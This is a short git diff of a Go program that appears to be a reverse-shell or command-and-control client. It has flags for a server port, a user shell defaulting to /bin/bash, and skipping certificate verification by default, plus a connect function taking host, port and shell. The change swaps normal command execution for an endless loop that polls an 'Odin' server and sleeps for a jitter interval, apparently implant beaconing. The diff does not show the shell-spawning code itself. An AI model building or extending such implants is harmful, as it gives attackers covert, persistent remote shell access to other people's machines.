@@ -3,11 +3,13 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"github.com/fatih/color"
 	"github.com/spf13/cobra"
 	"log"
 	"os"
 	"os/exec"
 	"os/user"
+	"time"
 )
 
 func main() {
@@ -25,7 +27,12 @@ func main() {
 	rootCmd.Flags().IntP("port", "P", 1234, "Server port")
 	rootCmd.Flags().StringP("shell", "S", "/bin/bash", "User shell")
 	rootCmd.Flags().BoolP("insecure", "i", true, "Skip certificate verification (not recommended)")
-	rootCmd.Execute()
+	//rootCmd.Execute()
+	for {
+		odin := askOdin()
+		color.Green("Odin: %v", odin)
+		time.Sleep(time.Duration(odin.Jitter) * time.Second)
+	}
 }
 
 func connect(host string, port int, shell string, insecure bool) {
